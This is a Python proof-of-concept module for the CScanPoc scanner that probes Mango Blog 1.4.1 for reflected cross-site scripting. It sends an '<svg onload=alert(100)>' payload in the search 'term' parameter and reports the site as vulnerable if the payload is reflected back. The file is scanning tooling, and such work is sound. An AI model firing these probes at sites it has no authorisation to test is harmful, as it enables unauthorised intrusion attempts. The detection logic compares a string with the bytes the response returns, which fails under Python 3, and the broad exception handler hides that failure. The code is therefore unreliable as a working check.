# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MangoBlog_0101'  # 平台漏洞编号，留空
    name = 'Mango Blog 1.4.1 /archives.cfm/search XSS跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-08'  # 漏洞公布时间
    desc = '''
        Mango Blog没有正确地过滤提交给archives.cfm/search页面的term参数便返回给了用户，
        远程攻击者可以通过提交恶意参数请求执行跨站脚本攻击，导致在用户浏览器会话中执行任意HTML和脚本代码。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-87080'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MangoBlog'  # 漏洞应用名称
    product_version = '1.4.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eee73f92-20e9-465c-ac35-659555f06890'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + \
                '/archives.cfm/search/?term=%3Csvg%20onload=alert(100)%3E'
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<svg onload=alert(100)>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
